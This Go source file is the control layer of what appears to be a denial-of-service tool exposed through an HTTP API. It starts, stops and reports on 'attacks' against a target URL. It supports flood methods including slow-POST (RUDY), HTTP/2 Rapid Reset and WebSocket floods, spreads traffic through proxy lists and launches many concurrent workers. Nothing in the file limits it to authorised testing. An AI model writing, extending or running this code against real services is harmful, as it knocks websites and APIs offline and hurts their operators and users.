package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// attackState is the singleton that owns a running attack's lifecycle.
type attackState struct {
	mu        sync.Mutex
	running   bool
	cfg       AttackConfig
	stop      chan struct{}
	startedAt time.Time
}

// global singleton – all handlers share this.
var state = &attackState{}

// validMethods is the canonical set of supported attack methods.
var validMethods = map[string]bool{
	"httpget":    true,
	"httppost":   true,
	"rudy":       true,
	"apiflood":   true,
	"rapidreset": true,
	"wsflood":    true,
}

// Start validates cfg, initialises the worker pool, and launches workers in
// a background goroutine. Returns an error if an attack is already running
// or if the config is invalid.
func (s *attackState) Start(cfg AttackConfig) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.running {
		return fmt.Errorf("attack already running against %s", s.cfg.Target)
	}

	// ── validation ────────────────────────────────────────────────────────────
	if cfg.Target == "" {
		return fmt.Errorf("target is required")
	}
	parsed, err := url.Parse(cfg.Target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		return fmt.Errorf("target must start with http:// or https://")
	}
	if !validMethods[strings.ToLower(cfg.Method)] {
		return fmt.Errorf("unknown method %q; valid: httpget | httppost | rudy | apiflood | rapidreset | wsflood", cfg.Method)
	}
	if cfg.Workers < 1 {
		return fmt.Errorf("workers must be >= 1")
	}
	if cfg.Duration < 1 {
		return fmt.Errorf("duration must be >= 1 second")
	}

	// ── apply defaults ────────────────────────────────────────────────────────
	if cfg.Method == "" {
		cfg.Method = "httpget"
	}

	// ── reset counters ────────────────────────────────────────────────────────
	totalSent.Store(0)
	totalErrors.Store(0)
	totalNonSucc.Store(0)

	// ── build client pool ─────────────────────────────────────────────────────
	needsClientPool := cfg.Method != "rapidreset" && cfg.Method != "wsflood"
	var clients []*http.Client

	if cfg.ProxyFile != "" {
		proxies, err := loadProxies(cfg.ProxyFile)
		if err != nil {
			return fmt.Errorf("failed to load proxy file: %w", err)
		}
		proxyList = proxies
		if needsClientPool {
			clients, err = buildClientPool(proxies, cfg.Workers)
			if err != nil {
				return fmt.Errorf("failed to build proxy client pool: %w", err)
			}
		}
	} else {
		proxyList = nil
		if needsClientPool {
			poolSize := cfg.Workers / 8
			if poolSize < 4 {
				poolSize = 4
			}
			if poolSize > maxDirectPool {
				poolSize = maxDirectPool
			}
			clients = buildDirectPool(poolSize)
		}
	}

	if clients == nil {
		clients = []*http.Client{{}}
	}

	// ── launch ────────────────────────────────────────────────────────────────
	stopCh := make(chan struct{})
	s.running = true
	s.cfg = cfg
	s.stop = stopCh
	s.startedAt = time.Now()

	go func() {
		for i := 0; i < cfg.Workers; i++ {
			go Worker(i, cfg.Target, cfg.Method, clients, stopCh, cfg.Verbose, cfg.RateDelay)
		}
		// auto-stop after duration
		select {
		case <-time.After(time.Duration(cfg.Duration) * time.Second):
			s.Stop() //nolint:errcheck
		case <-stopCh:
			// manually stopped – nothing to do
		}
	}()

	log.Printf("[api] attack started: method=%s target=%s workers=%d duration=%ds",
		cfg.Method, cfg.Target, cfg.Workers, cfg.Duration)
	return nil
}

// Stop cancels the running attack. Safe to call when no attack is running.
func (s *attackState) Stop() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.running {
		return fmt.Errorf("no attack is currently running")
	}
	close(s.stop)
	s.running = false
	log.Printf("[api] attack stopped: method=%s target=%s", s.cfg.Method, s.cfg.Target)
	return nil
}

// Status returns a snapshot of the current state and live stats.
func (s *attackState) Status() StatusResponse {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.running {
		return StatusResponse{Running: false}
	}

	elapsed := time.Since(s.startedAt).Seconds()
	sent := totalSent.Load()
	errs := totalErrors.Load()
	nonSucc := totalNonSucc.Load()

	rps := 0.0
	if elapsed > 0 {
		rps = float64(sent) / elapsed
	}

	cfg := s.cfg
	return StatusResponse{
		Running:   true,
		Config:    &cfg,
		StartedAt: s.startedAt.UTC().Format(time.RFC3339),
		ElapsedS:  elapsed,
		Stats: &LiveStats{
			Sent:    sent,
			Errors:  errs,
			NonSucc: nonSucc,
			RPS:     rps,
		},
	}
}
